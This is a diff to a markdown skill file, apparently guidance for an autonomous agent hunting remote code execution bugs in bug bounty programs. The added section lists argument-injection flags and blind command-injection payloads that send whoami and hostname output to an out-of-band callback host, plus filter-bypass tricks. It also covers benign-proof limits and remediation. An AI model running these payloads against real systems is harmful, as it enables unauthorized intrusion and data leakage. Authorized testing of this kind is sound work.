@@ -1,8 +1,11 @@
 ---
 name: hunt-rce
 description: Hunting skill for rce vulnerabilities. Built from 67 public bug bounty reports. Use when hunting rce on any target.
-sources: github, hackerone_public
+sources: github, hackerone_public, cve_database
 report_count: 87
+cwe: [CWE-94, CWE-78, CWE-502, CWE-1336, CWE-77]
+cvss_baseline: "Critical (9.8) unauth RCE — the norm; High (8.1) authenticated/constrained. Blind RCE confirmed by OOB callback is sufficient Critical PoC."
+related_skills: [hunt-ssti, hunt-deserialization, hunt-lfi, hunt-file-upload, hunt-nodejs, triage-validation]
 ---
 
 ## Autonomous Testing Priority
@@ -483,6 +486,30 @@ Cross-references:
 - `hunt-xxe` — Chain 6
 
 ---
+
+## New Techniques (2024-2026)
+
+### Injection into "safe" wrappers & argument injection
+RCE increasingly hides behind library calls, not bare `system()`:
+- **Argument injection** — user input becomes a CLI flag: `--use-askpass`/`-o ProxyCommand` (git/ssh/rsync/curl `-K`, `tar --to-command`, `ffmpeg`/ImageMagick coders), `PHP-CGI CVE-2024-4577`. No shell metacharacters needed — just a leading `-`.
+- **Expression/templating** — SpEL, OGNL (Struts), SSTI engines (`hunt-ssti`), Thymeleaf, Groovy, MVEL; `${...}`/`#{...}` reaching an evaluator.
+- **Deserialization** — Jackson/SnakeYAML/pickle/ViewState (`hunt-deserialization`).
+
+### Command-injection confirmation without noisy payloads
+Prefer blind OOB over `id` echo: `;nslookup $(whoami).OOB.oastify.com`, `` `curl http://OOB/$(hostname)` ``, bash `${IFS}` for space filters, `$(...)`/backtick/`|`/`%0a` newline, Windows `&`/`|`/`^` and `nslookup`. Use interactsh with a unique subdomain per injection point.
+
+### Recent high-footprint RCE classes to fingerprint
+Struts2 OGNL (CVE-2024-53677 file-upload param), GitLab/Confluence/Atlassian template RCEs, Ivanti/edge-appliance command injection, `langflow`/AI-tooling `exec` endpoints, image/doc parser CVEs (Ghostscript CVE-2023-36664, ImageTragick), and SSRF→internal-admin→RCE chains.
+
+### Post-confirmation discipline
+Demonstrate a single benign proof (`id`/OOB callback); do **not** run destructive commands, pivot, or persist. For a read-only program, a DNS callback is enough.
+
+## Remediation
+
+- Never pass user input to a shell; use argument arrays with no shell, and validate/allowlist values (reject leading `-` where an arg-injection risk exists).
+- Eliminate dynamic evaluation (SpEL/OGNL/template-from-input); use data-only parsers and safe deserialization (`hunt-deserialization` remediation).
+- Patch known-vuln components; run workers least-privilege and network-isolated (no cloud metadata/egress) to blunt blind RCE and exfil.
+- Keep an allowlist egress + EDR so a successful injection is detected and contained.
 
 ## Related Skills & Chains
 
